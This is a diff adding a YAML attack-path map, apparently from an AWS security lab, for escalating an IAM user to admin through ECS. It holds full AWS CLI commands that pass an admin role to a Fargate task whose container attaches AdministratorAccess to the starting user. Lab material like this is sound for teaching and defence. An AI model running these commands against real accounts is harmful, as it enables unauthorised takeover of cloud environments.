@@ -1,0 +1,95 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-001-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has ecs:CreateCluster, iam:PassRole, ecs:RegisterTaskDefinition,
+        and ecs:CreateService permissions, allowing it to spin up ECS infrastructure
+        and deploy containerized workloads using the privileged target role.
+
+    - id: ecs-cluster
+      label: "ECS Cluster"
+      type: resource
+      subType: ecs-task
+      arn: "arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-001-cluster"
+      description: >
+        An ECS cluster you create using ecs:CreateCluster. This is the logical grouping
+        that hosts the malicious Fargate service. No EC2 instances are required — the
+        Fargate launch type is fully serverless.
+
+    - id: task-definition
+      label: "Task Definition"
+      type: resource
+      subType: ecs-task
+      arn: "arn:aws:ecs:{region}:{account_id}:task-definition/pl-prod-ecs-001-task"
+      description: >
+        A task definition you register with ecs:RegisterTaskDefinition. The critical
+        element is setting the taskRoleArn to the privileged target role via iam:PassRole.
+        The container image runs AWS CLI commands that attach AdministratorAccess to the
+        starting user, effectively granting you admin rights.
+
+    - id: target-role
+      label: "Admin Target Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-001-to-admin-target-role"
+      description: >
+        This IAM role has AdministratorAccess. By passing it to the ECS task definition
+        and running the service, you execute code as this role. The running container
+        attaches AdministratorAccess to your starting user, completing the privilege
+        escalation.
+
+  edges:
+    - from: starting-principal
+      to: ecs-cluster
+      label: "ecs:CreateCluster"
+      description: >
+        Create a new ECS cluster to host the malicious Fargate service. This is a
+        prerequisite step before registering a task definition and service.
+      hints:
+        - "You can create ECS infrastructure and deploy container workloads."
+        - "Look for roles with administrative permissions that you can pass to ECS tasks."
+        - "Combine cluster creation, task definition registration, and service creation to run code as a privileged role."
+        - "Browse to https://pathfinding.cloud/paths/ecs-001 for technique details."
+      commands:
+        - description: "Create the ECS cluster"
+          command: "aws ecs create-cluster --cluster-name pl-ecs-001-attack-cluster"
+
+    - from: ecs-cluster
+      to: task-definition
+      label: "ecs:RegisterTaskDefinition + iam:PassRole"
+      description: >
+        Register a task definition that sets the privileged target role as the task
+        role. The iam:PassRole permission is consumed here to authorize assigning the
+        admin role to the ECS task.
+      hints:
+        - "Set taskRoleArn to the privileged target role when registering the task definition."
+        - "Use a container image that has the AWS CLI available (e.g., amazon/aws-cli)."
+        - "Use: aws ecs register-task-definition --task-role-arn <admin-role-arn> ..."
+      commands:
+        - description: "Register task definition with the privileged target role"
+          command: "aws ecs register-task-definition --family pl-ecs-001-attack-task --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-001-to-admin-target-role --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-001-to-admin-target-role --network-mode awsvpc --requires-compatibilities FARGATE --cpu 256 --memory 512 --container-definitions '[{\"name\":\"attack\",\"image\":\"amazon/aws-cli\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-001-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'"
+
+    - from: task-definition
+      to: target-role
+      label: "ecs:CreateService"
+      description: >
+        Create an ECS Fargate service that launches the malicious task definition.
+        The service starts a task that runs as the privileged target role and attaches
+        AdministratorAccess to the starting user.
+      commands:
+        - description: "Create the ECS service to run the malicious task"
+          command: "aws ecs create-service --cluster pl-ecs-001-attack-cluster --service-name pl-ecs-001-attack-service --task-definition pl-ecs-001-attack-task --desired-count 1 --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}'"
+        - description: "Verify privilege escalation by listing IAM users as the starting user"
+          command: "aws iam list-users --max-items 1"
